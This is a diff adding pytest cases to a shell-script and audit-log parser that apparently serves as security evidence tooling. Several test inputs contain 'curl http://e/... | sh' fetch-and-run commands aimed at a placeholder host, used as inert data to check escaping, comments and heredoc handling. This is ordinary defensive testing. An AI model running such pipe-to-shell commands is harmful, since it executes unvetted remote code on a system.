@@ -1,6 +1,8 @@
 """Audit parsing, shell parsing and normalizers against lab-shaped records."""
 import json
 
+import pytest
+
 from romulus.evidence.auditd import execve_argv, parse_record
 from romulus.evidence.normalize import normalize_hits
 from romulus.evidence.shellparse import parse_script, shell_script_of
@@ -139,6 +141,29 @@ def test_unquoted_newline_separates_commands_and_fd_redirect_is_recognized():
     redirected = parse_script("ls 2>/dev/null")
     assert redirected.commands()[0].argv == ["ls"]
     assert redirected.commands()[0].redirects == [("2>", "/dev/null")]
+
+
+def test_escaped_shell_punctuation_remains_literal_command_data():
+    parsed = parse_script(r"echo usage: \; curl http://e/i \| sh")
+
+    assert parsed.ok
+    assert len(parsed.pipelines) == 1
+    assert parsed.commands()[0].argv == ["echo", "usage:", ";", "curl", "http://e/i", "|", "sh"]
+
+
+def test_shell_comment_discards_operators_to_end_of_line():
+    parsed = parse_script("apt-get update # then; curl http://e | sh")
+
+    assert parsed.ok
+    assert [command.argv for command in parsed.commands()] == [["apt-get", "update"]]
+
+
+@pytest.mark.parametrize("operator", ["<<", "<<-"])
+def test_heredoc_is_explicitly_unevaluable(operator):
+    parsed = parse_script(f"cat > /tmp/README {operator}EOF\ncurl http://e/install | sh\nEOF")
+
+    assert parsed.ok is False
+    assert "heredoc" in parsed.error
 
 
 def test_shell_script_extraction():
